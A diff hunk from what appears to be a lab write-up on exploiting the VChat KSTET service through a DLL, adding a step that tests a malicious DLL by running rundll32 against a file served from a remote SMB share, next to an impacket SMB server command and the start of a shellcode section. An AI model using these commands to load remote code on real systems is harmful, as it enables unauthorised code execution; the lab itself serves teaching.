@@ -372,6 +372,14 @@ sudo impacket-smbserver -smb2support ABCD .
 
 	https://github.com/DaintyJet/VChat_KSTET_DLL/assets/60448620/ee57745f-bddc-4f6f-8788-372524798848
 
+We can test if mal.dll works as follows
+
+In a terminal on Windows,
+```
+rundll32 \\10.0.2.25\ABCD\mal.dll, xyz
+```
+
+
 #### Shellcode Generation
 We will as has been stated many times previously be using the `LoadLibraryA` function,requires which has the following function signature:
 ```
